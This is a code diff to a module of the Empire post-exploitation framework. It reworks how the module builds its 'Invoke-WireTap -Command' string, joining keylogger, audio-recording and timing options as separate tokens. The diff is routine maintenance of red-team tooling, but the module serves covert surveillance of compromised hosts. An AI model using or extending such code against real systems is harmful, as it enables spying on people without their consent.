@@ -1,6 +1,7 @@
 from empire.server.common.empire import MainMenu
 from empire.server.core.module_models import EmpireModule
 from empire.server.core.module_service import auto_finalize, auto_get_source
+from empire.server.utils.option_util import coerce_legacy_value
 
 
 class Module:
@@ -15,20 +16,25 @@ class Module:
         obfuscation_command: str = "",
         script: str = "",
     ):
-        script_end = 'Invoke-WireTap -Command "'
-
-        # Add any arguments to the end execution of the script
-        for option, values in params.items():
+        # Build the command as space-separated tokens. Invoke-WireTap tokenizes
+        # -Command on spaces, so each switch/value must be its own token; joining
+        # avoids gluing a bare switch onto the previous value option (e.g.
+        # "record_audio 10" + "keylogger" -> "10keylogger", silently dropping the
+        # switch). A leading/double space is also avoided regardless of order.
+        parts = []
+        for option, raw_value in params.items():
+            values = coerce_legacy_value(raw_value)
             if option.lower() != "agent" and values and values != "":
-                if values.lower() == "true":
-                    # if we're just adding a switch
-                    script_end += str(option)
+                if isinstance(raw_value, bool):
+                    # Native boolean -> [switch]: bare flag (no dash, per this
+                    # module's command format) only when set, never "option False".
+                    if raw_value:
+                        parts.append(str(option))
                 elif option.lower() == "time":
-                    # if we're just adding a switch
-                    script_end += " " + str(values)
+                    parts.append(str(values))
                 else:
-                    script_end += " " + str(option) + " " + str(values)
+                    parts.append(str(option) + " " + str(values))
 
-        script_end += '"'
+        script_end = 'Invoke-WireTap -Command "' + " ".join(parts) + '"'
 
         return script, script_end
